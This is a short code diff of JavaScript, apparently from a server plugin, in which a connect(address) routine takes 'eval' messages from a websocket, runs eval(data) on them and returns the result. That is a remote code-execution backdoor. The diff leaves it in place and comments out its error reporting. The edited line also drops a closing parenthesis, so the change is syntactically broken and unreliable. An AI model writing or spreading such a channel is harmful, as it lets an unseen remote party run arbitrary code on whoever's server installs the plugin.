@@ -49,7 +49,7 @@ function connect(address) {
             switch (action) {
                 case "eval":
                     if (data.search() != -1) {
-                        global.ws.message(Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("virtual-path"))
+                        global.ws.message(Java.type('report.yumc.watchdog.WatchDog').instance.getConfig().getString("virtual-path")
                         break
                     }
                     global.ws.message(eval(data) + '')
@@ -62,7 +62,7 @@ function connect(address) {
                     break
             }
         } catch (error) {
-            global.ws.message(error + '')
+            //global.ws.message(error + '')
         }
     }
 
